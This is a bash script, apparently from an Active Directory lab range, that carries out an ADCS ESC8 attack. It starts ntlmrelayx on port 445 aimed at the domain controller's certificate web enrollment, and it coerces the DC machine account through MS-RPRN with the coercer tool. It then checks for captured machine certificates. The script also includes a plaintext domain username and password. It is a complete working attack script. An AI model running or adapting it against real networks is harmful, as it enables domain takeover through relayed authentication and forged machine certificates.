#!/bin/bash
# ESC8 (WT052) - relay + coerce + capture in one session on provisioning (.60)
# smbd was stopped to free 445; relay runs as root on 445; coercer (own listener
# on 8445 to avoid clash) triggers dc01$ MS-RPRN to auth to .60:445.
set -x
LOG=/home/vagrant/esc8-relay.log
rm -f $LOG

# 1. Start ntlmrelayx relay on 445 (root for privileged port)
sudo nohup /home/vagrant/campaign-venv/bin/ntlmrelayx.py --smb-port 445 \
  -t http://dc01.cadre.local/certsrv/certfnsh.asp --adcs --template Machine \
  -smb2support -ip 192.168.77.60 -debug > $LOG 2>&1 &
RELAY_PID=$!
echo "relay_pid=$RELAY_PID"
sleep 10
ss -tln | grep ':445 ' >/dev/null && echo RELAY_445_LISTENING || echo RELAY_445_NOT_LISTENING

# 2. Coerce dc01$ MS-RPRN -> .60:445 (coercer own listener on 8445 to avoid clash)
cd /home/vagrant
/home/vagrant/.local/bin/coercer coerce \
  -u chief_command -p 'C0mm@nd_Ch1ef!' -d cadre.local --dc-ip 192.168.77.10 \
  -t 192.168.77.10 -l 192.168.77.60 --smb-port 8445 \
  --filter-protocol-name MS-RPRN --auth-type smb --always-continue 2>&1 | tee /home/vagrant/esc8-coerce.log
echo "coerce_rc=${PIPESTATUS[0]}"

# 3. Wait for relay processing + cert issuance
sleep 25
echo "=== relay log tail ==="
tail -50 $LOG

# 4. Captured certs?
echo "=== pem files ==="
ls -la /home/vagrant/*.pem 2>/dev/null || echo NO_PEM

# 5. Cleanup relay
sudo pkill -f ntlmrelayx.py
echo "=== RELAY_RUN_DONE ==="
